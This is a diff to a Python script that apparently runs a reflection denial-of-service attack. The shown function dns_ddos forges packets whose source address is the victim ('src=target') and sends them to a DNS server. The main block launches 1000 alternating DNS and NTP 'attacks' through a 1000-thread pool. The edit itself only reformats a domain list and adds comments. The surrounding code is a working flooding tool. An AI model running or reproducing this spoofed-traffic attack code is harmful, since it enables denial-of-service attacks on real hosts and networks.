@@ -11,9 +11,17 @@ import time
 
 
 def dns_ddos(target, dns_server):
-    dns_hosts = ["example.com", "www.example.com", "example.org", "example.be", "example.fr", "test.com", "a-very-long-domain-name.com", "a-very-long-domain-name.org",
-                 "oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof", "i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof", "domain.oof"]
-
+    # List of domain names to send DNS requests for
+    dns_hosts = [
+        "example.com", "www.example.com", "example.org", "example.be",
+        "example.fr", "test.com", "a-very-long-domain-name.com",
+        "a-very-long-domain-name.org",
+        "oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof",
+        "i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof",
+        "domain.oof"
+    ]
+    
+    # Send a DNS request for each domain name in the list
     for host in dns_hosts:
         ip = IP(src=target, dst=dns_server)
         udp = UDP(dport=5353)
@@ -40,14 +48,14 @@ if __name__ == "__main__":
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
         futures = []
-        for i in range(1000):
+        for i in range(1000): # alternating between DNS and NTP attacks
             if (i % 2 == 0):
                 futures.append(executor.submit(
                     dns_ddos, target, dns_server))
             else:
                 futures.append(executor.submit(
                     ntp_ddos, target, ntp_server))
-
+        # Wait for the tasks to complete
         for future in concurrent.futures.as_completed(futures):
             if future.result():
                 executor.shutdown(wait=False)
